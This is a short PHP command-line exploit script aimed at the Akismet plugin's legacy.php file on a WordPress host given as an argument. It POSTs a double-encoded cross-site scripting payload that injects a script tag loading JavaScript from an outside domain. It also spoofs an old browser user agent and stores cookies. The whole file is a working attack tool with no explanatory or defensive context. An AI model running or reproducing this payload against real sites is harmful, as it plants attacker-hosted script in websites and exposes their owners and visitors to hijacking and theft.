#!/usr/bin/php -f
<?php
#
# legacy.php curl exploit
#

//
// HTTP POST,
//

$target = $argv[1];

$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_URL,
"http://$target/wp-content/plugins/akismet/legacy.php");
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE
5.01; Windows NT 5.0)");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
"s=%2522%253E%253Cscript%2520src%253d%2F%2Fsantanafest.com.br%2Fenquete%2Fc%253E%253C%2Fscript%253E");
curl_setopt($ch, CURLOPT_TIMEOUT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_TIME, 3);
curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookie_$target");
$buf = curl_exec ($ch);
curl_close($ch);
unset($ch);

echo $buf;
?>
